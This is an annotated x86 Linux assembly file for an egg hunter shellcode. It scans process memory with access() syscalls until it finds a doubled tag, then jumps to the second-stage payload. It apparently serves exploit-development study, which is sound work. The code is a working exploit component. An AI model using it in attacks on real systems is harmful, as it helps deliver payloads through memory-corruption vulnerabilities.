# Author: @bugsam
# Date: 12/07/2020

global _start
;                       [1] i386-linux-gnu/asm/unistd_32.h
;                       [2] fcntl.h
;                       [3] asm-generic/errno-base.h
;                       [4] i386-linux-gnu/sys/user.h

_start:

        ; SYS_ACCESS constructor receives two argument, the first a pointer
        ; to the pathname, the second is a mode 

        sub edx, edx            ; zero register
        sub ecx, ecx            ; 0x00 (F_OK) as defined in [2]
        mov ebx, 0x90999099     ; *pathname (EGG)
        sub eax, eax            ; zero register
next_page:
        or dx, 0xfff            ; PAGE_SIZE <- 0xfff (4095) or 0 to 4095 (4096)
                                ; in Linux, physical memory are mapped to virtual addresses
                                ; spaces, the memory management unit (MMU) translates virtual 
                                ; addresses to physical addresses automatically, because of 
                                ; performance, the memory is spit in pages, to each page a 
                                ; number called page frame number is given. A page frame in 
                                ; IA32 have a size ordered by a shift of 1 unsigned long 12 
                                ; times (2^12 = 4096) as defined in [4].
next_addr:
        inc edx                 ; base for next PAGE FRAME
        pusha                   ; save all registers into stack
        lea ebx, [edx+4]        ; last offset for the current PAGE FRAME
        mov al, 0x21            ; 0x21 (SYS_ACCESS) as defined in [1]
        int 0x80                ; call syscall, on success (EAX <- 0)
        cmp al, 0xf2            ; 0xE (EFAULT) as defined in [3]
                                ; NOT(0xe) + 1 = 0xf2 (two's_complement) byte operation
        popa                    ; restore all registers from stack
        jz next_page
        cmp [edx], ebx          ; compare with *pathname (first EGG)
        jne next_addr           ; jump to next addr if not found first EGG
        cmp [edx+0x4], ebx      ; compare with *pathname (second EGG)
        jne next_addr           ; jump to next addr if not found second EGG
        jmp edx                 ; if found both EGG, jump to second stage
